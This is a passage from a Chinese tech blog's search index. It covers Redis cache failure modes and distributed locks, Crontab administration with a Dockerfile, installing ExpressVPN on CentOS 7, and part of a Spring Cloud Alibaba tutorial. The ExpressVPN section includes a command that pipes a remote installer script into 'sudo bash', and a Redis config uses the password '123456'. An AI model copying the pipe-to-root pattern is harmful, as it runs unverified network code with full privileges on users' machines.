&lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt;&lt;/dependency&gt; 堆外内存溢出 对 Lettuce 进行压力测试时，可能会出现 io.netty.util.internal.OutOfDirectMemoryError 的错误，即产生了堆外内存溢出。主要原因是 SpringBoot 2.0 以后默认使用 Lettuce 作为操作 Redis 的客户端，它是基于 Netty 进行网络通信，而由于旧版 Lettuce 自身的 Bug 导致一些使用过的内存没有被及时清理掉，因此最终会出现内存溢出的问题。解决方案有两种：一是升级 Lettuce 的版本，而是使用 Jedis 作为 Redis 的客户端。 配置 Redis 的连接信息，在 application.yml 配置文件中添加以下内容 12345spring: redis: port: 6379 host: 192.168.56.103 password: 123456 简单使用 RedisTemplate 类操作 Redis 12345678910@Autowiredpublic StringRedisTemplate stringRedisTemplate;@Testpublic void testStringRedisTemplate() { ValueOperations&lt;String, String&gt; ops = stringRedisTemplate.opsForValue(); ops.set("hello", "world_" + UUID.randomUUID().toString()); String hello = ops.get("hello"); System.out.println(hello);} 缓存失效问题在高并发的业务场景下，缓存失效一般分为几种情况，包括 缓存穿透、缓存雪崩、缓存击穿。 缓存穿透缓存穿透是指查询一个不存在的数据，由于缓存是不命中，将去查询数据库，但是数据库也无此记录，因此没有将这次查询的 Null 结果写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义。在流量大的时候，数据库可能就会被压垮，要是有人恶意利用不存在的 Key 频繁攻击应用服务，这就存在安全漏洞。为了解决缓存穿透的问题，当数据库查询不到数据时，可以将空结果写入缓存，并设置较短的过期时间。 缓存雪崩缓存雪崩是指在设置缓存时，采用了相同的过期时间，导致大量缓存在某一时刻同时失效，外部请求全部转发到数据库，而数据库由于瞬时压力过重导致雪崩。为了解决缓存雪崩问题，可以在原有的缓存失效时间基础上增加一个随机值，比如 1 ~ 5 分钟随机，这样每一个缓存的过期时间的重复率就会降低，进而很难引发缓存集体失效的事件。 缓存击穿对于一些设置了过期时间的 Key，如果这些 Key 可能会在某些时间点被超高并发地访问，也就是一种非常 热点 的数据。那么在这个时候，需要考虑一个问题，如果这个 Key 在大量请求同时进来前刚好失效，那么所有对这个 Key 的数据查询都会落到数据库，这种现象一般称为 缓存击穿。为了解决缓存击穿的问题，可以通过加锁（分布式锁）来限制对数据库的访问。除了加锁之外，还可以使用 Cananl 数据库中间件来解决缓存击穿问题。` 缓存数据一致性更新缓存数据时，一般有两种模式（统称写模式），分别是 双写模式 与 失效模式，这两种写模式都存在缓存数据一致性问题（即可能会读取到脏数据）。 双写模式双写模式 是指先将数据写入数据库，然后再写入缓存。在 双写模式 下，读到的数据可能会不是最新的（存在延迟），同时还可能会读取到暂时性的脏数据，图解说明如下。值得一提的是，双写模式 属于 最终一致性 的一类。 脏数据问题分析 如上图，线程 A 和 B 都去写数据库，正常情况下应该是，A 先写数据库先写缓存，B 后写数据库后写缓存；但是由于卡顿等原因，导致写缓存 2 在最前，写缓存 1 在后面就出现了不一致，出现了脏数据；但是这是暂时性的脏数据问题，在数据稳定和缓存过期以后，又能得到最新的正确数据。若希望从根本上解决脏数据的问题，可以使用分布式锁（读写锁），也就是写数据库和写缓存这两个操作（两者可以是看做是一个操作）需要获取到锁才能执行，但是加了分布式锁以后，系统的整体性能会下降。另外，也可以使用 Canal 中间件来解决缓存的一致性问题。 失效模式失效模式 是指写完数据库，不用写缓存，而是删除缓存；等有请求进来读数据的时候，发现缓存中没有数据，就会主动查询数据库，并将查询结果放到缓存里面，这也叫 触发主动更新。值得一提的是，失效模式 也存在读取到脏数据的问题，如下图所示。 缓存一致性解决方案总结无论是双写模式还是失效模式，都会导致缓存数据与数据库数据不一致的问题，即多个实例同时更新时会出事，那么怎么办呢？ 缓存数据 + 过期时间的配合使用，也足够解决大部分业务对于缓存的要求。 如果是用户纬度数据 (订单数据、用户数据)，这种数据并发更新的几率非常小，可以不用考虑一致性问题，缓存数据加上过期时间，每隔一段时间自动触发读的主动更新即可。 如果是菜单列表、商品介绍等基础数据，也可以使用 Canal 中间件订阅数据库 binlog 的方式来更新缓存。 通过加分布式锁来保证并发读写的准确性，写 + 写 的时候按顺序排好队执行，读 + 读 则无所谓，所以适合使用分布式读写锁（如果业务不关心脏数据，允许临时的脏数据存在，则可以不使用分布式锁）。 总结 能放入缓存的数据本就不应该是实时性、一致性要求超高的，所以缓存数据的时候加上过期时间，保证每天拿到当前最新的数据即可 遇到实时性、一致性要求高的数据，就应该直接查询数据库，即使效率慢一点。 系统不应该过度设计，否则会增加系统的复杂性。 使用 Canal 解决一致性问题使用 Canal 数据库中间件，可以从根本上解决缓存一致性的问题，但会增加系统的复杂性，整理的工作流程图如下： 本地锁与分布式锁本地锁本地锁，如使用 JDK 的 synchronized 关键字或者 JUC 包下的 Lock 类等。本地锁只能锁住当前的 Java 进程，并不适用于分布式的业务场景。 注意 使用本地锁操作缓存时，需要注意锁的时序问题，即查询数据库与写入缓存这两者必须是原子操作，点击查看详细的图解说明。 分布式锁分布式锁，如使用 Redisson 第三方库提供的各种锁。分布式锁可以简单理解为同时去一个地方 占坑，如果占到，就执行业务逻辑，否则就必须等待，直到占到锁为止。占坑 可以去 Redis，也可以去数据库。等待过程可以是使用自旋的方式。 Redis 分布式锁的实现这里将介绍如何使用 Redis 实现分布式锁，更多内容建议参考 Reids 官方中文文档。 实现命令 set resource-key resource-value nx ex max-lock-time：设置 key 和设置过期时间，属于原子命令 例如： set sku 56a4e5e-a022 nx ex 300，其中的 key 是 sku，value 是 56a4e5e-a022，过期时间是 300 （单位是秒），设置成功会返回 OK，否则返回 Nil 实现流程 核心问题使用 Redis 实现分布式锁，最重要的是锁要有过期时间，不然万一业务代码抛出异常或者 Redis 宕机，Redis 锁将永远得不到释放，进而出现 死锁，导致其他线程一直获取不到资源。为了避免这种情况的发生，就必须保证执行加锁时，设置 Key 与设置过期时间这两者执行的原子性。值得一提的是，在解锁的时候，也必须保证判断 Key 是否存在与删除 Key 这两者执行的原子性。 Redis 实现分布式锁的核心内容 加锁原子性：通过 Redis 自身的 setnxex 命令加锁 解锁原子性：通过 Redis + Lua 脚本实现解锁，不能直接使用 DEL 命令删除锁 执行解锁时，必须确保解锁的是自己加的锁 代码实现 在项目的 resources 目录下创建 lua 目录，并且创建 redisLock.lua 文件，用于保证解锁操作的原子性 123456if redis.call("get", KEYS[1]) == ARGV[1]then return redis.call("del", KEYS[1])else return 0end 提示 更多关于 Redis 分布式锁中 Lua 脚本的使用教程，请点击 这里。 引入 Maven 坐标 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; Lua 脚本的配置类 12345678910111213141516171819@Configurationpublic class RedisLuaConfig { @Resource private StringRedisTemplate stringRedisTemplate; /** * 删除锁 */ public boolean deleteLock(String lockKey, String value) { List&lt;String&gt; keyList = Collections.singletonList(lockKey); DefaultRedisScript&lt;Long&gt; redisScript = new DefaultRedisScript&lt;&gt;(); redisScript.setScriptSource(new ResourceScriptSource(new ClassPathResource("lua/redisLock.lua"))); redisScript.setResultType(Long.class); Long result = stringRedisTemplate.execute(redisScript, keyList, value); return 1 == result; } } Redis 分布式锁的服务类 123456789101112131415161718192021222324@Servicepublic class RedisLockService { @Resource private RedisLuaConfig redisLuaConfig; @Resource private StringRedisTemplate stringRedisTemplate; /** * 加锁（原子操作） */ public boolean lock(String lockKey, String value, long time, TimeUnit timeUnit) { return stringRedisTemplate.opsForValue().setIfAbsent(lockKey, value, time, timeUnit); } /** * 解锁（原子操作） */ public boolean unlock(String lockKey, String value) { return redisLuaConfig.deleteLock(lockKey, value); } } 单元测试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@SpringBootTestpublic class RedisLockTest { @Autowired private RedisLockService lockService; /** * 加锁/解锁 */ private void reduceSku() throws Exception { // 锁的唯一标识，用于保证解锁的是当前线程自己加的锁 String value = UUID.randomUUID().toString(); // 加锁 + 设置锁的过期时间，必须是原子操作 boolean lock = lockService.lock("lock", value, 10, TimeUnit.SECONDS); if (lock) { System.out.println("==&gt; 加锁成功"); // 模拟业务执行的耗时 TimeUnit.SECONDS.sleep(8); // 解锁，必须满足原子性，通过 Redis + Lua 脚本实现 boolean unlock = lockService.unlock("lock", value); System.out.println("==&gt; 解锁" + (unlock ? "成功": "失败")); } else { System.out.println("==&gt; 加锁失败"); } } /** * 并发测试 */ @Test public void multiThreadLock() throws Exception { for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { try { reduceSku(); } catch (Exception e) { e.printStackTrace(); } }).start(); } System.in.read(); } } 测试结果 1234567891011==&gt; 加锁成功==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 加锁失败==&gt; 解锁成功 总结 为了防止持有过期锁的客户端误删现有锁的情况出现，可以使用以下方案改进 a) 不使用固定的字符串作为键的值，而是设置一个不可猜测（如 UUID）的长随机字符串作为口令串（token）。 b) 不使用 DEL 命令来解锁，而是发送一个 Lua 脚本，这个脚本只在客户端传入的值与口令串相匹配时，才对键进行删除。 Redisson 分布式锁的使用上面介绍的方式并不推荐用来实现 Redis 分布式锁。Redis 官方推荐参考 the Redlock algorithm 的实现，因为这种方法只是复杂一点，但是却能保证更好的使用效果。其中，基于 Java 语言开发的分布式锁的框架就是 Redisson。 Redisson 基础使用教程 Redisson 的使用请阅读 Redisson 分布式锁使用教程。 参考博客 Redis set NX EX 命令介绍 Redis 分布式锁中 Lua 脚本的使用 Redis 基于 setnx、setex 连用实现分布式锁 Redis 基于通过 setnxex (互斥锁) 实现分布式锁 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Linux 管理 Crontab 服务",url:"/posts/vbd8mmaf.html",text:'前言 本文主要介绍如何在 Linux 系统上安装和管理 Crontab 服务，适用于 Debian 9、CentOS 7 系统。 Crontab 安装Crontab 安装（CentOS 7）1# yum instal crontabs Crontab 安装（Debian 9）1# apt-get install cron Crontab 服务管理Crontab 服务管理（CentOS 7）1234567891011# 启动Crontab服务# systemctl start crond# 关闭Crontab服务# systemctl stop crond# 重启Crontab服务# systemctl restart crond# 查看Crontab服务的运行状态# systemctl status crond Crontab 服务管理（Debian 9）1234567891011121314151617# 启动Crontab服务# service cron start# 关闭Crontab服务# service cron stop# 重启Crontab服务# service cron restart# 查看Crontab服务的运行状态# service cron status# 或者使用以下命令替代# /etc/init.d/cron stop# /etc/init.d/cron start# /etc/init.d/cron status# /etc/init.d/cron restart Crontab 日志管理Crontab 日志管理（CentOS 7）12# 查看Crontab的日志信息# tail -f -n 10 /var/log/cron Crontab 日志管理（Debian 9）123456789101112131415# 安装rsyslog服务# apt-get install rsyslog# 创建Crontab的日志文件# touch /var/log/cron.log# 开启Crontab的日志记录# vim /etc/rsyslog.confcron.* /var/log/cron.log #取消这行内容的注释即可# 启动rsyslog服务# service rsyslog start# 查看Crontab的日志信息# tail -f -n 10 /var/log/cron.log Crontab 任务管理Crontab 任务管理（CentOS 7）12345678910111213141516171819# 编辑并保存当前用户的计划任务# crontab -e# 查看当前用户的所有计划任务# crontab -l# 提示：以下通过Vim编辑器更改配置文件的方式，不一定能让新增的Crontab计划任务生效# 编辑root用户的计划任务（依赖root用户的权限）# vim /var/spool/cron/root# 查看root用户的计划任务（依赖root用户的权限）# cat /var/spool/cron/root# 编辑www用户的计划任务（依赖root或者www用户的权限）# vim /var/spool/cron/www# 查看www用户的计划任务（依赖root或者www用户的权限）# cat /var/spool/cron/www Crontab 任务管理（Debian 9）12345678910111213141516171819# 编辑并保存当前用户的计划任务# crontab -e# 查看当前用户的所有计划任务# crontab -l# 提示：以下通过Vim编辑器更改配置文件的方式，不一定能让新增的Crontab计划任务生效# 编辑root用户的计划任务（依赖root用户的权限）# vim /var/spool/cron/crontabs/root# 查看root用户的计划任务（依赖root用户的权限）# cat /var/spool/cron/crontabs/root# 编辑www用户的计划任务（依赖root或者www用户的权限）# vim /var/spool/cron/crontabs/www# 查看www用户的计划任务（依赖root或者www用户的权限）# cat /var/spool/cron/crontabs/www Shell 脚本添加 Crontab 计划任务12# 添加系统级的计划任务，依赖root用户的权限，同时需要指定以哪个用户来执行计划任务，此方法适用于绝大多数的Linux发行版# echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontab Crontab 的使用命令格式crontab [-u user] file crontab [-u user] [ -e | -l | -r ] -u user：用来设置某个用户的 Crontab 服务 file：命令文件的名称，表示将 file 作为 Crontab 的任务列表文件并载入 Crontab -e：编辑某个用户的 Crontab 配置文件内容。如果不指定用户，则表示编辑当前用户的 Crontab 配置文件 -l：显示某个用户的 Crontab 配置文件内容，如果不指定用户，则表示显示当前用户的 Crontab 配置文件内容 -r：从 /var/spool/cron 目录中删除某个用户的 Crontab 配置文件，如果不指定用户，则默认删除当前用户的 Crontab 配置文件 Crontab 使用格式 第 1 列：分钟 0～59 第 2 列：小时 0～23 第 3 列：日 1～31 第 4 列：月 1～12 第 5 列：星期 0～7 (0 和 7 表示星期天) 第 6 列：需要执行的命令 Crontab 使用案例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 每5秒执行一次0/5 * * * * command# 每一小时执行一次0 */1 * * * command# 每天6点执行一次0 6 * * * command# 每天7:50执行一次50 7 * * * command# 每隔45分钟执行一次*/45 * * * * command# 在12月内，每天6点到12点，每隔3个小时0分钟执行一次0 6-12/3 * 12 * command# 每小时的第3和第15分钟执行3,15 * * * * command# 在上午8点到11点的第3和第15分钟执行3,15 8-11 * * * command# 每隔两天的上午8点到11点的第3和第15分钟执行3,15 8-11 */2 * * command# 每周一上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1 command# 每晚的21:30执行30 21 * * * command# 每月1、10、22日的4:45执行45 4 1,10,22 * * command# 每周六、周日的01:10执行10 1 * * 6,0 command# 每天18:00至23:00之间每隔30分钟执行0,30 18-23 * * * command# 每星期六的晚上23:00执行0 23 * * 6 command# 晚上11点到早上7点之间，每隔一小时执行0 23-7 * * * command Docker 构建 Crontab 镜像警告 这里不建议使用 CentOS 镜像，因为 Docker 的官方 CentOS 镜像中没有提供 systemd 服务，虽然有对应的 解决方案，但解决起来稍微复杂了一点 如果基于 CentOS 镜像构建 Crontab 镜像，启动容器时往往会出现错误信息： Failed to get D-Bus connection: Operation not permitted，更多资料可参考 这里 用于构建 Crontab 镜像的 Dockerfile 的内容如下，基于 Debian 9（Stretch）系统 1234567891011121314151617181920212223242526272829303132333435from augurproject/python2-and-3MAINTAINER clay&lt;clay@gmail.com&gt;RUN touch /var/log/cron.logRUN mkdir -p /usr/share/python_scriptsENV workpath /usr/share/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install cron rsyslog apt-utils net-tools telnet wget curl vimRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontabRUN echo "59 23 * * * root /usr/bin/python2 /usr/share/python_scripts/mysql-check.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 将上面的内容保存到 Dockerfile-Crontab 文件中，然后使用以下命令构建 Crontab 镜像 1# docker build -f Dockerfile-Crontab -t clay/crontab:1.0 . 使用 Docker-Compose 来管理 Crontab 镜像，其中 Docker-Compose 的配置文件内容如下 12345678910version: "3.5"services: crontab: image: clay/crontab:1.0 container_name: crontab volumes: - /usr/local/python_scripts:/usr/share/python_scripts restart: always network_mode: bridge 创建并后台启动 Crontab 容器 1# docker-compose up -d Crontab 命令在线生成工具 Crontab Generator 参考资料 Linux 中的 Crontab 定时任务 Crontab 定时任务不执行的一些原因总结 使用 Shell 脚本或命令行添加 Crontab 定时任务 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Centos7 安装 ExpressVPN 客户端",url:"/posts/4d31c632.html",text:'前言ExpressVPN 介绍 ExpressVPN 官网 ExpressVPN 的优势 ExpressVPN 支持的路由器型号 ExpressVPN 支持的所有设备类型 ExpressVPN 支持同一个账号最多 5 个设备同时使用 ExpressVPN 如何支持 5 个以上的设备同时使用一个账号 快速入门ExpressVPN 客户端安装在 ExpressVPN 官网下载 Fedora 64-bit 版的客户端，通过命令安装客户端 1# yum install expressvpn-3.4.2.4-1.x86_64.rpm 激活，只需要拷贝 ExpressVPN 的激活码到终端，然后按下回车键即可 1$ expressvpn activate 可以选择通过共享匿名诊断报告来帮助改进 ExpressVPN ，输入 Y 接受，或输入 n 拒绝 如果希望以后不再选择向 ExpressVPN 发送诊断报告，可以运行以下命令 1$ expressvpn preferences set send_diagnostics false ExpressVPN 客户端卸载1# yum remove expressvpn 值得一提的是，如果日后需要更新 ExpressVPN 的客户端，只需要先卸载旧版的客户端，然后再安装新版的客户端即可 ExpressVPN 客户端连接服务器连接 VPN 服务器，如果是第一次连接，ExpressVPN 将使用 “智能位置” 功能来选择服务器位置，这是根据速度和邻近性等因素推荐的。如果不是第一次连接，ExpressVPN 将连接到最近连接过的服务器位置 1$ expressvpn connect 默认情况下，如果成功连接到 VPN 服务器，在系统的通知面板里将看到一条指示 ExpressVPN 已连接的通知 当单个 ExpressVPN 账号超过 5 台设备同时使用时，终端会输出以下错误日志信息 验证是否可以正常连接到 VPN 服务器 1$ curl -I www.google.com 断开 VPN 连接，可使用以下命令 1$ expressvpn disconnect 进阶使用ExpressVPN 网速测试安装并使用 Speedtest CLI 工具来测试 ExpressVPN 的实际连接速度，也可以直接使用 Speedtest 的 Python 版 或者 Speedtest 的网页版进行测试。 123456789101112131415161718# 卸载其他版本的 Speedtest# rpm -qa | grep speedtest | xargs -I {} sudo yum -y remove {}# 安装 Speedtest# curl -s https://install.speedtest.net/app/cli/install.rpm.sh | sudo bash# yum install speedtest# 开始网速测试$ speedtest# 或者指定 Speedtest 的网速显示单位$ speedtest -u kB/s# 提示：Speedtest CLI 支持的单位如下：Decimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s ExpressVPN 客户端常用管理命令12345678# 显示所有推荐的 VPN 服务器位置$ expressvpn list# 显示所有有效的 VPN 服务器位置$ expressvpn list all# 显示最近连接过的三个 VPN 服务器位置$ expressvpn list recent 12345# 连接到智能推荐的 VPN 服务器位置$ expressvpn connect smart# 连接到特定的 VPN 服务器位置$ expressvpn connect "Hong Kong - 2" 12345678# 设置 ExpressVPN 使用 TCP 作为 VPN 协议$ expressvpn protocol tcp# 设置 ExpressVPN 使用 UDP 作为 VPN 协议$ expressvpn protocol udp# 设置 ExpressVPN 自动选择 VPN 协议，包括 lightway_udp、tcp、udp 协议$ expressvpn protocol auto 12345# 设置 ExpressVPN 在启动时自动连接到上次连接过的 VPN 服务器位置$ expressvpn autoconnect true# 禁用 ExpressVPN 在启动时自动连接$ expressvpn autoconnect false 12345# 查看 ExpressVPN 当前的连接状态$ expressvpn status# 查看 ExpressVPN 的后台服务状态$ systemctl status expressvpn 12345678# 查看 ExpressVPN 当前的配置信息$ expressvpn preferences# 获取 ExpressVPN 特定的配置信息$ expressvpn preferences get desktop_notifications# 设置 ExpressVPN 特定的配置信息$ expressvpn preferences set desktop_notifications false 12# 查看 ExpressVPN 的命令帮助文档$ man expressvpn ExpressVPN Chrome 浏览器插件安装如果希望使用图形用户界面（GUI）来管理 ExpressVPN 的 Linux 客户端，则可以使用适用于 Chrome 的 ExpressVPN 浏览器插件来实现。在 Chrome 的应用商店里安装 ExpressVPN 插件，然后简单配置 Chrome 浏览器插件即可。特别注意，要使用 Chrome 的浏览器插件，需要确保已下载并激活 ExpressVPN 的 Linux 客户端。 高级使用ExpressVPN 使用建议 建议优先使用速度较快的 lightway_udp 协议，其次才是 tcp、udp 协议 Centos 7 安装 ExpressVPN 的客户端后，默认的 VPN 代理是系统全局代理 由于 ExpressVPN 的客户端是系统全局代理，因此不需要额外的配置就可以直接在 Centos 7 系统内的终端、浏览器使用 VPN 代理 由于 ExpressVPN 的客户端是系统全局代理，因此不需要额外的配置就可以直接让 Centos 7 系统内的所有用户直接使用 VPN 代理，包括终端、浏览器 ExpressVPN 客户端的默认配置项如下： 12345678auto_connect falsedesktop_notifications falsedisable_ipv6 trueforce_vpn_dns truelightway_cipher autonetwork_lock defaultpreferred_protocol autosend_diagnostics true Docker 安装 ExpressVPN 构建 Privoxy、Tor、ExpressVPN 的 Docker 镜像 Linux 实现国内外流量分流ExpressVPN 支持在 Windows、Mac、Android、Router 系统上使用隧道分流功能（即国内外流量分流），但不支持在 Linux 系统上使用隧道分流功能。在 Linux 环境下可以尝试通过 Docker + Privoxy + SwitchyOmega（Chrome 浏览器插件） 来实现隧道分流（如下图），Docker 负责运行 ExpressVPN 的服务，Privoxy 负责网络代理，SwitchyOmega 负责国内外流量分流。值得一提的是，使用该方案之后 ExpressVPN 的 Chrome 浏览器插件就无法正常使用了，此时需要从外部连接到 Docker 容器，然后在终端里使用命令行管理 ExpressVPN 的服务，亲测该方案有效。 官方教程与软件下载ExpressVPN 软件下载 ExpressVPN 的 Linux 客户端 ExpressVPN 的 Chrome 插件 ExpressVPN 的 Android 客户端 ExpressVPN 的 Windows 客户端 ExpressVPN 官方教程 Linux 配置 DNS 服务器 Linux 系统使用 ExpressVPN 路由器系统使用 ExpressVPN Windows 系统使用 ExpressVPN Windows、Mac 系统设置 ExpressVPN 隧道分流 参考资料 ExpressVPN 进阶使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos 开发工具"},{title:"Spring Cloud Alibaba 综合集成架构演示案例",url:"/posts/7f5a87b2.html",text:'前言Spring Cloud 是一套较为全面的微服务框架集，集成了如服务注册发现、配置中心、消息总线、负载均衡、断路器、API 网关等功能实现。而在网上经常会发现 Spring Cloud 与阿里巴巴的 Dubbo 进行选择对比，这样做其实不是很妥当，前者是一套较为完整的微服务架构方案，而 Dubbo 只是服务治理与 RPC 实现方案。Dubbo 在国内有着非常大的用户群体，但是其周边设施与组件相对来说并不那么完善。很多开发者用户又很希望享受 Spring Cloud 的生态，因此也会有一些 Spring Cloud 与 Dubbo 一起使用的案例与方法出现，但是一直以来大部分 Spring Cloud 整合 Dubbo 的使用方案都不完善，直到 Spring Cloud Alibaba 的出现，才得以解决这样的问题。 问题延伸由于 Feign 是基于 HTTP Restful 的调用，在高并发下的性能不够理想，那么 RPC 方案能否切换为 Dubbo？Spring Cloud 与阿里系的若干组件能否完美集成呢？ 整体系统架构系统架构图 API 网关：系统统一入口，屏蔽架构内部结构，统一安全拦截，采用 Zuul 实现 Application-1：应用 1，模拟应用，提供 HTTP 接口服务给 API 网关调用（Feign） Service-1：微服务 1，模拟微服务，提供 Dubbo 接口服务给 Application-1 调用 Service-2：微服务 2，模拟微服务，提供 Dubbo 接口服务给 Application-1 调用 架构分层 接入层：API 网关 应用层：Application-1 微服务层：Service-1、Service-2 调用流程 所有访问系统的请求都要经过 API 网关，网关转发 HTTP 请求至 Application-1，然后 Application-1 使用 Dubbo 调用 Service-1 完成自身业务，最后 Sevice-1 使用 Dubbo 调用 Service-2 完成自身业务。至此，完成所有组件贯穿。 Application 与 Sevice 的区别 形成 Service 支撑 Application 的整体架构，增加多变的 Application 甚至不需要变动 Service Service 提供了基础服务功能，而 Application 组装基础服务功能，提供给用户直接可用的业务，适合快速迭代开发 Service 服务粒度小、功能基础，不易发生改变，而 Application 提供上游业务功能，紧贴业务需求，容易发生改变 Spring Cloud Alibaba 集成架构演示案例1.0、技术选型Spring Boot、Spring Cloud Zuul、Spring Cloud OpenFeign、Nacos、Dubbo 1.1、版本说明 Zuul 1.3.1 Dubbo 2.7.8 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Dubbo 2.2.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE Spring Cloud Alibaba Nacos Discovery 2.1.3.RELEASE 本案例中使用的各开源组件的版本如上，其中 Spring Cloud Alibaba Nacos Config 并没有真正发挥配置中心的作用，因为本文为了方便演示，并没有将 bootstrap.yml 配置文件里的部分配置信息发布到 Nacos Server（配置中心 + 注册中心），尤其是 api-gateway 工程里的路由映射配置，点击下载完整的案例代码。 1.2、工程结构采用 Maven 工程结构（如下），为了方便演示，各组件的开发顺序为： service-2 -&gt; service-1 -&gt; application-1 -&gt; api-gateway 123456789alibaba-micro-service-study 整体父工程├── api-gateway API 网关，端口：56010├── application-1 应用 1，端口：56020├── service-1 服务 1 父工程│&nbsp;&nbsp; ├── service-1-api 服务 1 API│&nbsp;&nbsp; ├── service-1-business 服务 1 业务实现，端口：56030└── service-2 服务 2 父工程 ├── service-2-api 服务 2 API └── services-2-business 服务 2 业务实现，端口：56040 1.3、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt;&lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;api-gateway&lt;/module&gt; &lt;module&gt;application-1&lt;/module&gt; &lt;module&gt;service-1&lt;/module&gt; &lt;module&gt;service-2&lt;/module&gt; &lt;/modules&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-dubbo.version&gt;2.2.3.RELEASE&lt;/spring-cloud-dubbo.version&gt; &lt;spring-cloud-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-nacos.version&gt; &lt;/properties&gt; &lt;!-- 管理依赖 --&gt; 